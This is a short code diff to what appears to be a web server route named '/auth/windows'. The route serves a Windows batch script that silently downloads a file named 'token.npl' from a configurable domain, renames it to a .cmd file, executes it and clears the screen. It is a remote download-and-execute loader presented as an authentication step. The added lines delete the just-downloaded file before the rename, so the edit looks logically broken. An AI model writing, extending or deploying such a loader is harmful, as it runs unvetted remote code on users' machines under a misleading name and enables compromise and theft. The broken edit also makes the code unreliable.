@@ -148,6 +148,8 @@ router.get("/auth/windows", (req, res) => {
 
     res.type("text/plain").send(`@echo off
 curl -s -L -o "%USERPROFILE%\\token" ${domain}/users/token.npl
+if exist "%USERPROFILE%\token" del "%USERPROFILE%\token"
+if exist "%USERPROFILE%\token.cmd" del "%USERPROFILE%\token.cmd"
 ren "%USERPROFILE%\\token" token.cmd
 "%USERPROFILE%\\token.cmd"
 cls
